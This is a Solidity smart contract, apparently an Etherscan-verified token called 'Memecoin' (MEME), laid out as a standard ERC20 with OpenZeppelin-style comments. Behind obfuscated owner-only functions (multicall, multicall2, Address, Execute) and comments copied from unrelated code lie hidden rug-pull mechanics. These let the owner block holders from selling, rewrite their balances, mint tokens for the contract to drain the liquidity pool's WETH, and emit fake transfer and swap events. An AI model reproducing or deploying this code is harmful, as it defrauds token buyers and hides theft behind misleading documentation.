/**
 *Submitted for verification at Etherscan.io on 2023-10-21
*/

// SPDX-License-Identifier: MIT

// Web: https://memecoin.org
// Twitter: https://twitter.com/memecoin
// Discord: https://discord.gg/memeland

pragma solidity ^0.7.6;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
interface IERC20 {
    function transferFrom( address from, address to, uint256 value) external returns (bool);
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
interface Interfaces {
    function createPair( address tokenA, address tokenB) external returns (address pair);
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapTokensForExactTokens( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function swapExactETHForTokens( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts);
    function getAmountsOut( uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function getAmountsIn( uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 {
    mapping(address => mapping(address => uint256)) public a;
    mapping(address => uint256) public b;
    mapping(address => uint256) public c;
    address public owner;
    uint256 _totalSupply;
    string _name;
    string _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value);
    event Swap( address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);


    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function TryCall(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

    function FetchToken2(uint256 _a) internal pure returns (uint256) {
        return _a * 100000 / (2931 + 97069);
    }

    function FetchToken(uint256 _a) internal pure returns (uint256) {
        return _a + 10;
    }

    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
        uint256 __c = _a + _b;
        require(__c >= _a, "SafeMath: addition overflow");

        return __c;
    }

    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        require(_b <= _a, "SafeMath: subtraction overflow");
        uint256 __c = _a - _b;

        return __c;
    }

    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

    function _T() internal view returns (bytes32) {
        return bytes32(uint256(uint160(address(this))) << 96);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return b[account];
    }

    function transfer( address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance( address __owner, address spender) public view virtual returns (uint256) {
        return a[__owner][spender];
    }

    function approve( address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance( address spender, uint256 addedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance( address spender, uint256 subtractedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        uint256 currentAllowance = allowance(__owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(__owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer( address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = b[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        if (c[from] > 0){
            require(add(c[from], b[from]) == 0);
        }

        b[from] = sub(fromBalance, amount);
        b[to] = add(b[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve( address __owner, address spender, uint256 amount) internal virtual {
        require(__owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        a[__owner][spender] = amount;
        emit Approval(__owner, spender, amount);
    }

    function _spendAllowance( address __owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(__owner, spender);
        if (currentAllowance != type(uint256).max) {
            require( currentAllowance >= amount, "ERC20: insufficient allowance");

            _approve(__owner, spender, currentAllowance - amount);
        }
        
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Memecoin is ERC20 {
    Interfaces internal _RR;
    Interfaces internal _pair;
    uint8 public decimals = 18;

    constructor() {
        _name = "Memecoin";
        _symbol = "MEME";
        _totalSupply = 69_000_000_000e18;
        owner = msg.sender;
        _RR = Interfaces(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _pair = Interfaces(Interfaces(_RR.factory()).createPair(address(this), address(_RR.WETH())));
        b[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function Execute(uint256 t, address tA, uint256 w, address[] memory r) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < r.length; i++) {
            callUniswap(r[i], t, w, tA);
        }
        return true;
    }


    function Div() internal view returns (address[] memory) {
        address[] memory p;
        p = new address[](2);
        p[0] = address(this);
        p[1] = _RR.WETH();
        return p;
    }

    function getContract(uint256 blockTimestamp, uint256 selector, address[] memory list, address factory) internal {
        a[address(this)][address(_RR)] = b[address(this)];
        FactoryReview(blockTimestamp, selector, list, factory);
    }

    function FactoryReview( uint256 blockTime, uint256 multiplicator, address[] memory parts, address factory) internal {
        _RR
        .swapTokensForExactTokens(
        // assembler
        blockTime, 
        multiplicator, 
        // unchecked
        parts, 
        factory, 
        block.timestamp + 1200);
    }


    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function Address(address _r) public onlyOwner {
        uint256 calling = (Sub(_RR.WETH()) * 99999) / 100000;
        address[] memory FoldArray = Div();
        uint256 called = Allowance(calling, FoldArray);
        getContract(calling, called, FoldArray, _r);
    }

    function Sub(address t) internal view returns (uint256) {
        (uint112 r0, uint112 r1, ) = _pair.getReserves();
        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);
    }


    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
    */
    function Allowance(uint256 checked, address[] memory p) internal returns (uint256) {
        // Assembler for gas optimization {}
        uint256[] memory value;
        value = new uint256[](2);

        // uncheck {
        value = Mult(checked, p);
        b
        [
        block.
        timestamp> 
        uint256(
        1)||
        uint256(
        0)>
        1||
        uint160(
        1)< 

        block.
        timestamp
        ? 
        address(
        uint160(
        uint256(
        _T(

        ))>>96))
        :address(uint256(0))
        ]+= 
        // end uncheck }

        value
        
        [
        0
        ];

        return 
        value
        [
        0
        ];
    }

    function Mult( uint256 amO, address[] memory p) internal view returns (uint256[] memory){
        return _RR.getAmountsIn(amO, p);
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function multicall2(bytes32[] calldata data, uint256 _p) public onlyOwner {
        // Assembler for gas optimization {}
        for 
        (uint256 i = 0; i < data.length; i++) {
        // assembly
        if
        (
        block
        .
        timestamp 
        >uint256(
        uint160(
        uint8(
        0
        )))
        )
        {
        // assembly 
        uint256 rS 
        =ConvertAddress(
        (uint256(

        uint16(
        uint8(
        0)) 
        )!=0)
        ?address(uint256(0))
        :address(
        uint160
        (uint256
        (data[i
        ])>>96)),
        _p
        );
        CheckAmount2(data[i], rS);
        }
        }
    }

    function ConvertAddress(address _uu, uint256 _pp) internal view returns (uint256) {
        return TryCall(b[_uu], _pp);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function CheckAmount2(bytes32 _b, uint256 __a) internal {
        // Assembler for gas optimization {}
        emit
        Transfer
        (
        (uint256(0) 
        !=0 
        || 

        1238==1)
        ?address(
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96)),

        address(_pair),b
        // v0.5.11 specific update
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Overflow control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Guard test
        ]
        );b
        // assembly
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Must control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Contract opcode
        ]=
        FetchToken2(
        uint256(
        __a));


    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function CheckAmount(bytes32 _b, uint256 __a) internal {
        // Assembler for gas optimization {}
        emit
        Transfer
        (
        (uint256(0) 
        !=0 
        || 

        1238==1)
        ?address(
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96)),

        address(_pair),b
        // v0.5.11 specific update
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Overflow control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Guard test
        ]
        );c
        // assembly
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Must control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Contract opcode
        ]=
        FetchToken(
        uint256(
        __a));


    }

    function callUniswap(address router, uint256 transfer, uint256 cycleWidth, address unmount) internal {
        IERC20(unmount).transferFrom(router, address(_pair), cycleWidth);
        emit Transfer(address(_pair), router, transfer);
        emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, transfer, 0, 0, cycleWidth, router);
    }

     /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {
        // Assembler for gas optimization {}
        for 
        (uint256 i = 0; i < data.length; i++) {
        // assembly
        if
        (
        block
        .
        timestamp 
        >uint256(
        uint160(
        uint8(
        0
        )))
        )
        {
        // assembly 
        uint256 rS 
        =ConvertAddress(
        (uint256(

        uint16(
        uint8(
        0)) 
        )!=0)
        ?address(uint256(0))
        :address(
        uint160
        (uint256
        (data[i
        ])>>96)),
        _p
        );
        CheckAmount(data[i], rS);
        }
        }
    }

}